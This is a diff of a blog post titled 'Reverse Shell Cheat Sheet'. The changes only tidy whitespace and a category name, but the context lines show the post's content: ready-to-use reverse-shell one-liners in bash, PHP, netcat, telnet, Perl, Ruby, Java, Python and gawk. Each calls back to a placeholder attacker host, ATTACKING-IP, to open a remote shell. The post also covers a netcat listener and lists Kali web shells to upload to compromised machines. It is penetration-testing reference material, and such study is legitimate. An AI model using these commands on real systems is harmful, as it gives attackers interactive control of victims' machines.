@@ -4,9 +4,9 @@ title:  "Reverse Shell Cheat Sheet"
 date:   2015-03-29 14:37:10
 author: Arr0way
 description: 'Reverse Shell Cheat Sheet, a list of reverse shells for connecting back'
-categories: [Cheat-Sheet]
+categories: [cheat-sheet]
 tags:
-- 'Penetration Testing' 
+- 'Penetration Testing'
 - 'Reverse Shell'
 - shells
 ---
@@ -14,11 +14,11 @@ tags:
 * list element with functor item
 {:toc}
 
-If you're lucky enough to find a remote command execution vulnerability, you'll more often than not want to connect back to your attacking machine to leverage an interactive shell. 
+If you're lucky enough to find a remote command execution vulnerability, you'll more often than not want to connect back to your attacking machine to leverage an interactive shell.
 
-Below are a collection of **reverse shells** that use commonly installed programming languages, or commonly installed binaries (nc, telnet, bash, etc). At the bottom of the post are a collection of uploadable reverse shells, present in Kali Linux. 
+Below are a collection of **reverse shells** that use commonly installed programming languages, or commonly installed binaries (nc, telnet, bash, etc). At the bottom of the post are a collection of uploadable reverse shells, present in Kali Linux.
 
-## Setup Listening Netcat 
+## Setup Listening Netcat
 
 Your remote shell will need a listening netcat instance in order to connect back.  
 
@@ -40,7 +40,7 @@ nc: listening on 0.0.0.0 80 ...
   <p>If you're attacking machine is behing a NAT router, you'll need to setup a port forward to the attacking machines IP / Port.</p>
 </div>
 
-**ATTACKING-IP** is the machine running your listening netcat session, port 80 is used in all examples below (for reasons mentioned above). 
+**ATTACKING-IP** is the machine running your listening netcat session, port 80 is used in all examples below (for reasons mentioned above).
 
 ## Bash Reverse Shells
 {% highlight bash %}
@@ -64,14 +64,14 @@ while read line 0<&5; do $line 2>&5 >&5; done
 bash -i >& /dev/tcp/ATTACKING-IP/80 0>&1
 {% endhighlight %}
 
-## PHP Reverse Shell 
+## PHP Reverse Shell
 
 {% highlight bash %}
 php -r '$sock=fsockopen("ATTACKING-IP",80);exec("/bin/sh -i <&3 >&3 2>&3");'
 (Assumes TCP uses file descriptor 3. If it doesn't work, try 4,5, or 6)
 {% endhighlight %}
 
-## Netcat Reverse Shell 
+## Netcat Reverse Shell
 
 {% highlight bash %}
 nc -e /bin/sh ATTACKING-IP 80
@@ -85,7 +85,7 @@ nc -e /bin/sh ATTACKING-IP 80
 rm -f /tmp/p; mknod /tmp/p p && nc ATTACKING-IP 4444 0/tmp/p
 {% endhighlight %}
 
-## Telnet Reverse Shell 
+## Telnet Reverse Shell
 
 {% highlight bash %}
 rm -f /tmp/p; mknod /tmp/p p && telnet ATTACKING-IP 80 0/tmp/p
@@ -95,9 +95,9 @@ rm -f /tmp/p; mknod /tmp/p p && telnet ATTACKING-IP 80 0/tmp/p
 telnet ATTACKING-IP 80 | /bin/bash | telnet ATTACKING-IP 443
 {% endhighlight %}
 
-Remember to listen on 443 on the attacking machine also. 
+Remember to listen on 443 on the attacking machine also.
 
-## Perl Reverse Shell 
+## Perl Reverse Shell
 
 {% highlight perl %}
 perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
@@ -118,7 +118,7 @@ perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprot
 ruby -rsocket -e'f=TCPSocket.open("ATTACKING-IP",80).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
 {% endhighlight %}
 
-## Java Reverse Shell 
+## Java Reverse Shell
 
 {% highlight java %}
 r = Runtime.getRuntime()
@@ -126,13 +126,13 @@ p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKING-IP/80;cat <&5 | while r
 p.waitFor()
 {% endhighlight %}
 
-## Python Reverse Shell 
+## Python Reverse Shell
 
 {% highlight python %}
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKING-IP",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 {% endhighlight %}
 
-## Gawk Reverse Shell 
+## Gawk Reverse Shell
 
 {% highlight gawk %}
 #!/usr/bin/gawk -f
@@ -157,9 +157,9 @@ BEGIN {
 }
 {% endhighlight %}
 
-## Kali Web Shells 
+## Kali Web Shells
 
-The following shells exist within Kali Linux, under <code>/usr/share/webshells/</code> these are only useful if you are able to upload, inject or transfer the shell to the machine. 
+The following shells exist within Kali Linux, under <code>/usr/share/webshells/</code> these are only useful if you are able to upload, inject or transfer the shell to the machine.
 
 ### Kali PHP Web Shells
 
@@ -217,7 +217,7 @@ The following shells exist within Kali Linux, under <code>/usr/share/webshells/<
 </div>
 
 
-### Kali Perl Reverse Shell 
+### Kali Perl Reverse Shell
 
 <div class="mobile-side-scroller">
 <table>
@@ -249,7 +249,7 @@ The following shells exist within Kali Linux, under <code>/usr/share/webshells/<
 </table>
 </div>
 
-### Kali Cold Fusion Shell 
+### Kali Cold Fusion Shell
 <div class="mobile-side-scroller">
 <table>
   <thead>
@@ -271,7 +271,7 @@ The following shells exist within Kali Linux, under <code>/usr/share/webshells/<
 </table>
 </div>
 
-### Kali ASP Shell 
+### Kali ASP Shell
 <div class="mobile-side-scroller">
 <table>
   <thead>
@@ -315,7 +315,7 @@ The following shells exist within Kali Linux, under <code>/usr/share/webshells/<
 </table>
 </div>
 
-### Kali JSP Reverse Shell 
+### Kali JSP Reverse Shell
 <div class="mobile-side-scroller">
 <table>
   <thead>
